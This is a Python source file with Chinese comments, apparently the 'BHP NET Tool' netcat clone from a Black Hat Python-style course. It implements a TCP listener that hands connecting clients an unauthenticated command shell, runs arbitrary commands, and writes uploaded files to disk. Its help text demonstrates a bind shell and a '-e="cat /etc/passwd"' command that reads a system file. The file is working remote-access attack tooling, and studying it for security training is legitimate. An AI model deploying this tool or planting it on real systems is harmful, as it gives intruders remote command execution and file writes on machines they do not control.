# -*- coding: utf-8 -*-
import socket
import argparse     # 命令行参数
import shlex
import subprocess
import sys
import textwrap     # 文本自动换行
import threading


def execute(cmd):
    ''' 执行命令 '''
    cmd = cmd.strip()
    if not cmd:
        return
    # 运行命令并且返还该命令的输出
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()


class NetCat:
    ''' TCP客户端 '''
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # SO_REUSEADDR允许重用本地地址和端口
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def handle(self, client_socket):
        ''' 执行 '''
        # 执行命令
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        # 上传文件
        elif self.args.upload:
            # 文件缓冲区
            file_buffer = b""
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, "wb") as f:
                f.write(file_buffer)
            message = f"保存文件 {self.args.upload}"
            client_socket.send(message.encode())
        # 打开命令行
        elif self.args.command:
            cmd_buffer = b""
            while True:
                try:
                    client_socket.send(b"")
                    while "\n" not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b""
                except Exception as e:
                    print(f"服务端已终止 {e}")
                    self.socket.close()
                    sys.exit()

    def send(self):
        ''' 发送 '''
        # 连接客户端
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            # 将缓冲区的数据发送
            self.socket.send(self.buffer)
        try:
            while True:
                recv_len = 1
                response = ""
                while recv_len:
                    # 接收返回的数据
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input("> ")
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print("已终止.")
            self.socket.close()
            sys.exit()      # 退出程序

    def listen(self):
        ''' 监听 '''
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            # 接受连接请求
            client_socket, _ = self.socket.accept()     # 返回一个socket对象和连接方的地址
            client_socket.send(b"OK")
            client_thread = threading.Thread(target=self.handle, args=(client_socket, ))
            client_thread.start()   # 启动

    def run(self):
        ''' 运行 '''
        if self.args.listen:
            # 接收方
            self.listen()
        else:
            # 发送方
            self.send()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="BHP NET Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        # 帮助信息
        epilog=textwrap.dedent("""demo:
            netcat.py -t 192.168.1.168 -p 5555 -l -c    # 打开命令行 shell
            netcat.py -t 192.168.1.168 -p 5555 -l -u=mytest.txt    # 指定上传文件
            netcat.py -t 192.168.1.168 -p 5555 -l -e=\"cat /etc/passwd\"    # 执行命令
            echo 'ABC' | ./netcat.py -t 192.168.1.168 -p 135    # 将文本回显到服务器端口135
            netcat.py -t 192.168.1.168 -p 5555    # 连接到服务器
            """))
    # 添加参数
    parser.add_argument("-c", "--command", action="store_true", help="打开命令行 shell")
    parser.add_argument("-e", "--execute", help="执行指定命令")
    parser.add_argument("-l", "--listen", action="store_true", help="监听")
    parser.add_argument("-p", "--port", type=int, default=5555, help="设置端口")
    parser.add_argument("-t", "--target", default="192.168.1.168", help="设置ip")
    parser.add_argument("-u", "--upload", help="指定上传文件")
    # 将parser中的属性传递至args当中
    args = parser.parse_args()
    # 缓冲区
    if args.listen:
        # 如果需要进行监听
        buffer = ".."
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()